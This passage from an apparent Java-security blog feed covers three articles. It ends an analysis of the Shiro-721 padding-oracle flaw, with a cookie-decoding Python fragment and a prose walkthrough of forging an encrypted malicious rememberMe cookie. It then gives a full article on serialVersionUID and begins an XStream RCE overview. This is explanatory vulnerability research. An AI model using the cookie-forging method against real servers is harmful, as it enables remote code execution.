class="number">16</span>:])</span><br><span class="line"><span class="keyword">return</span> remember_bin</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">()</span>:</span></span><br><span class="line">cookie = <span class="string">'oDH/OY3qZfZpZm1RFaA1DmI4p5H3EoqZ68EXtik2MykvTm/eRECW8vEBUCHC06MbEWfOyUwH58DwO9wdnTwgJNqx5x6slvWck6JX3wLZVn3sENcTFn3CstloTZKQ6vp1lh0YHyb631QLPjeZ3LutBu8hU7omax9AYffVggodgAuAdaiA9beWb4rntBLh3s0RAs7HDwypm+qvUOM1FghD3+KON/C3bCTyjk/x+NCHaMJif6pUY/n0eTvl17WTLIYY1PygQBtxDuMtpsIZUkEZPMaBSLwXyzJIY34iWMleTKqlSk5i3zy9MufA2OR/dJjZfFdpIV2j5YJleEFnbjOhDtU7dOG38Y4uHwEnxKQgFcJNKETUKD6Blrw3/7orH6Ay9J1EFEw2dXhrWBhSvHuZ1AL3rn96vcvWUSIMZqpFDXTz0gqgLa0n397U/WPF188nqPNOPV2JT4mW6Xhkhwl6kUmIE7TxhT04Xms5g4qAjiWAsdOs5V+Kw/c/TqNNroFI'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"rememberMe.bin"</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(decode(get_encrypted_text(cookie)))</span><br><span class="line"></span><br><span class="line">crack()</span><br></pre></td></tr></table></figure><p>熟悉的aced0005～</p><p>注意，最后一行都是0x10，说明已经是填充过后的了</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211019100052257.png" alt="image-20211019100052257" style="zoom:50%;"><h3 id="前提2：Java反序列化格式"><a href="#前提2：Java反序列化格式" class="headerlink" title="前提2：Java反序列化格式"></a>前提2：Java反序列化格式</h3><p>Java反序列化是按照字节流的格式进行读取，反序列化数据末尾的脏数据不会报错。</p><p>这是因为：readobject读取的serialdata长度是在serialdata头部就约定好的。</p><h3 id="payload构造原理"><a href="#payload构造原理" class="headerlink" title="payload构造原理"></a>payload构造原理</h3><p>原理是攻击者将正常用户的rememberMe拿到，使用不断的Padding Oracle Attack对我们的恶意反序列化payload编写密文，进行加密。</p><p>经过调试，我们可以知道：</p><ol><li><p>当用户的cookie认证失败，服务端就会返回一个cookie: <strong>rememberMe=deleteMe;</strong></p></li><li><p>只要padding错误，服务端就会返回一个cookie: <strong>rememberMe=deleteMe;</strong></p></li></ol><p>所以我们只要在AES密文(rememberMe经过Base64解密之后的值)后面添加脏数据，解密之后符合padding model就可以绕过了。</p><p>复习一遍Shiro加解密流程：</p><p>加密：token -(序列化)-&gt; token_serilized(aced0005…) -(AES_Enc)-&gt; cipher -(Base64)-&gt; rememberMe</p><p>解密：rememberMe -(Base64)-&gt;cipher-(AES_Dec)-&gt;token_serilized(aced0005…)-(反序列化)-&gt;token</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211021004247569.png" alt="image-20211021004247569" style="zoom:50%;"><p>审计了一下<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">longofo</a>师傅的项目，终于搞懂了最终的payload是怎么生成的。</p><p>假设现在yso.bin是我们的恶意payload，它作为明文首先要被分组，最后一列填充，倒序排列。</p><p>为什么倒序排列？因为遍历明文时候，第一组其实就是明文的最后一组，构造我们的恶意密文的方向其实是从后向前的。</p><p>首先生成一组脏数据X，这组脏数据会放在最终payload的最后一组，规范一点，X被0-127任意值填充。</p><p>我们需要的是：</p><ol><li>正常的rememberMe</li><li>二元组：0x00*16+X</li></ol><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211021094442668.png" alt="image-20211021094442668" style="zoom:50%;"><p>接下来使用padding oracle attack去加密这些分组，怎么做？爆破！</p><p>rememberMe+0x00*16+X发送给server，padding oracle attack 获得X对应的tempIV。</p><p>我们希望X的解密结果是我们Payload的最后一组，所以我们有：</p><p>P[n] XOR tempIV = C[n-1]</p><p>也就是说，我们知道X这组的middle是tempIV，知道明文P[n]，我们就可以通异或，定制化倒数第二组密文。</p><p>之后继续这样做，构建二元组，rememberMe+0x00*16+C[n-1]，发送给服务器，获得倒数第二组的tempIV，再与我们的倒数第二组明文进行异或，得到倒数第三段密文。</p><p>这样不断向前推导，可以获得IV+C，对它进行Base64加密，这串就是新的rememberMe。</p><p>当Shiro解密时，AES解密结果decoded就是我们的恶意payload（肯定符合padding model 是因为我们的payload前期已经处理过了，已经做好了填充），直接参与反序列化，触发漏洞。</p><p>Shiro对AES解密的结果只校验了是否符合padding model，符合就无脑去反序列化，这也是漏洞成因的关键所在。<br>我们payload最后其实是有一串脏数据的（那一串被随机数填满的），但是这并不影响反序列化，因为反序列化读取是有自己的规范的，只读serialdata指定长度，反完走人，后面多出来的不管。</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>老洞新看，发现很多师傅的文章中，没有讲最终的payload是如何生成的，自己尝试玩了几天，还是很有收获的。</p><p>感谢<a href="https://github.com/Zebork" target="_blank" rel="noopener">Zebork</a>师兄与我一起头脑风暴，Padding Oracle Attack那块确实很有意思^ _ ^</p><p>参考：</p><p><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data" target="_blank" rel="noopener">Going the other way with padding oracles: Encrypting arbitrary data!</a><br><a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">工具：PaddingOracleAttack-Shiro-721</a><br><a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">Shiro721公告</a><br><a href="https://tomassky.github.io/2020/08/30/shiro_unserialize/" target="_blank" rel="noopener">利用：Shiro反序列化漏洞</a><br><a href="https://lightless.me/archives/padding-oracle-attacks.html" target="_blank" rel="noopener">Padding Oracle Attack 浅析</a><br><a href="https://www.mi1k7ea.com/2020/09/17/%E6%B5%85%E6%9E%90CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E4%B8%8EPadding-Oracle-Attack/" target="_blank" rel="noopener">Mi1k7ea：浅析CBC字节翻转攻击与Padding Oracle Attack</a><br><a href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/" target="_blank" rel="noopener">Mi1k7ea：浅析Shiro Padding Oracle Attack（Shiro721）</a><br><a href="https://www.anquanke.com/post/id/203869#h3-2" target="_blank" rel="noopener">从更深层面看Shiro Padding Oracle漏洞</a><br><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated" target="_blank" rel="noopener">ShiroExploit检测工具</a><br><a href="https://mp.weixin.qq.com/s/j_gx9C_xL1LyrnuFFPFsfg" target="_blank" rel="noopener">Shiro组件漏洞与攻击链分析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浮云游子意，落日故人情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;填Shiro的坑。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="shiro" scheme="https://fynch3r.github.io/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>serialVersionUID的那些事</title>
    <link href="https://fynch3r.github.io/serialVersionUID%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>https://fynch3r.github.io/serialVersionUID%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2021-07-28T05:50:42.000Z</published>
    <updated>2021-07-28T06:24:16.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>老至居人下，春归在客先。</p></blockquote><p>serialVersionUID，有点东西。</p><a id="more"></a><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在前两篇文章的基础上，我们知道了序列化就是把对象转化为字节流，反序列化就是将字节流还原为内存对象。</p><p>在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常，即是InvalidCastException。</p><p>总体来说：<strong>serialVersionUID的作用就是维护两端类文件的版本一致性。</strong></p><p>serialVersionUID有两种显示的生成方式：   </p><p>一是默认的1L，比如：private static final long serialVersionUID = 1L；</p><p>二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段；</p><h1 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h1><p>serialVersionUID如果我们没有显示赋值，那他是如何生成的呢？</p><p>来到序列化流程中writeNonProxy方法中的getSerialVersionUID：</p><img src="../images/serialVersionUID%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210728140147771.png" alt="image-20210728140147771" style="zoom:50%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getSerialVersionUID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// REMIND: synchronize instead of relying on volatile?</span></span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 使用了一个内部类的方式，使用特权计算computeDefaultSUID():</span></span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Long <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进入computeDefaultSUID方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">computeDefaultSUID</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 代理</span></span><br><span class="line">    <span class="keyword">if</span> (!Serializable<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">cl</span>) || <span class="title">Proxy</span>.<span class="title">isProxyClass</span>(<span class="title">cl</span>))</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dout = <span class="keyword">new</span> DataOutputStream(bout);</span><br><span class="line">        <span class="comment">// 类名</span></span><br><span class="line">        dout.writeUTF(cl.getName());</span><br><span class="line">      </span><br><span class="line">        <span class="comment">// 修饰符</span></span><br><span class="line">        <span class="keyword">int</span> classMods = cl.getModifiers() &amp;</span><br><span class="line">            (Modifier.PUBLIC | Modifier.FINAL |</span><br><span class="line">             Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  方法</span></span><br><span class="line">        Method[] methods = cl.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">            classMods = (methods.length &gt; <span class="number">0</span>) ?</span><br><span class="line">                (classMods | Modifier.ABSTRACT) :</span><br><span class="line">                (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">        &#125;</span><br><span class="line">        dout.writeInt(classMods);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">            <span class="comment">// 继承的接口</span></span><br><span class="line">            Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">            String[] ifaceNames = <span class="keyword">new</span> String[interfaces.length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">                ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 接口名</span></span><br><span class="line">            Arrays.sort(ifaceNames);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">                dout.writeUTF(ifaceNames[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 全部属性</span></span><br><span class="line">        Field[] fields = cl.getDeclaredFields();</span><br><span class="line">        MemberSignature[] fieldSigs = <span class="keyword">new</span> MemberSignature[fields.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            fieldSigs[i] = <span class="keyword">new</span> MemberSignature(fields[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(fieldSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">            <span class="comment">// 成员签名</span></span><br><span class="line">            MemberSignature sig = fieldSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">                 Modifier.TRANSIENT);</span><br><span class="line">            <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">                ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                dout.writeUTF(sig.name);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 是否有静态初始化</span></span><br><span class="line">        <span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">            dout.writeUTF(<span class="string">"&lt;clinit&gt;"</span>);</span><br><span class="line">            dout.writeInt(Modifier.STATIC);</span><br><span class="line">            dout.writeUTF(<span class="string">"()V"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 构造器</span></span><br><span class="line">        Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">        MemberSignature[] consSigs = <span class="keyword">new</span> MemberSignature[cons.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">            consSigs[i] = <span class="keyword">new</span> MemberSignature(cons[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(consSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">            MemberSignature sig = consSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">                 Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">                 Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">                dout.writeUTF(<span class="string">"&lt;init&gt;"</span>);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MemberSignature[] methSigs = <span class="keyword">new</span> MemberSignature[methods.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">            methSigs[i] = <span class="keyword">new</span> MemberSignature(methods[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(methSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> comp = ms1.name.compareTo(ms2.name);</span><br><span class="line">                <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">                    comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> comp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">            MemberSignature sig = methSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">                 Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">                 Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">                dout.writeUTF(sig.name);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dout.flush();</span><br><span class="line"><span class="comment">// 哈希操作，返回结果就是serialVersionUID</span></span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">"SHA"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] hashBytes = md.digest(bout.toByteArray());</span><br><span class="line">        <span class="keyword">long</span> hash = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hash;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，serialVersionUID是由将类名，属性名，属性修饰符，继承的接口，属性类型，名称，方法，静态代码块等等这些都考虑进去了。</p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>假设现在A、B双方准备进行序列化交互，A序列化，B反序列化，双方机器上都有Student类：</p><ul><li><p>情景1：双方都利用系统默认生成的serialVersionUID。</p><p>如果这时候A决定为Student增加/缺少字段，此时B再反序列化会<strong>报错</strong>。</p><p>因为此时A、B两台机器上的Student类已经版本不一致了。</p></li><li><p>情景2：双方协商好使用统一的serialVersionUID。</p><p>这样如果A决定为Student增加/缺少字段，此时B再反序列化<strong>不会报错</strong>。</p><p>对于增加的字段。会根据类型赋给他初始值。</p></li></ul><p>原因：</p><p>自动生成的，由于类文件变化，它也会跟着发生变化，会出现版本不一致的问题，导致反序列化失败。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;老至居人下，春归在客先。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;serialVersionUID，有点东西。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="Java序列化原理" scheme="https://fynch3r.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化漏洞梳理</title>
    <link href="https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/"/>
    <id>https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/</id>
    <published>2021-07-27T08:20:37.000Z</published>
    <updated>2021-11-21T11:59:21.572Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>百川东到海，何时复西归？</p></blockquote><p>这一篇来梳理XStream不同版本RCE，也会是补全计划的一部分。    </p><a id="more"></a><h1 id="老实本分的XStream"><a href="#老实本分的XStream" class="headerlink" title="老实本分的XStream"></a>老实本分的XStream</h1><p>XStream格局可以的，直接把自己的<a href="https://x-stream.github.io/security.html" target="_blank" rel="noopener">List&lt; CVE &gt;</a>放在了首页。。。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727162943451.png" alt="image-20210727162943451" style="zoom:50%;"><p>会按照时间线逐个梳理。</p><p>基本API操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"peter"</span>,<span class="number">18</span>);</span><br><span class="line"><span class="comment">// object to xml</span></span><br><span class="line">String xml = xStream.toXML(person);</span><br><span class="line"><span class="comment">// xml to object</span></span><br><span class="line">Object o = xStream.fromXML(xml);</span><br></pre></td></tr></table></figure><h1 id="重要组件"><a href="#重要组件" class="headerlink" title="重要组件"></a>重要组件</h1><p>XStream类图，参考<a href="https://www.jianshu.com/p/387c568faf62" target="_blank" rel="noopener">XStream 源码解析</a>：</p><img src="http://m0d9.me/images/pasted-136.png" alt="img" style="zoom:150%;"><p>主要分为四个部分：</p><h2 id="MarshallingStrategy"><a href="#MarshallingStrategy" class="headerlink" title="MarshallingStrategy"></a>MarshallingStrategy</h2><p>编码策略：</p><ul><li>marshall  : object-&gt;xml         编码</li><li>unmarshall :  xml-&gt; object   解码</li></ul><p>两个重要的类：</p><ul><li><p>TreeMarshaller: 树编组程序  调用Mapper和Converter把 java对象-&gt; XML</p><p>其中的start方法开始编组，convertAnother方法把java对象转化成XML。 </p></li></ul><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727192641609.png" alt="image-20210727192641609" style="zoom:50%;"><ul><li><p>TreeUnmarshaller ： 树解组程序 调用Mapper和Converter把 XML-&gt;java对象</p><p>里面的start方法开始解组，convertAnother方法把class转化成java对象。</p></li></ul><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727193134470.png" alt="image-20210727193134470" style="zoom:50%;"><h2 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h2><p>映射器</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727174404413.png" alt="image-20210727174404413" style="zoom:70%;"><p>通过mapper获取对象对应的类、成员、Field属性的Class对象，赋值给XML的标签字段。</p><h2 id="Converter"><a href="#Converter" class="headerlink" 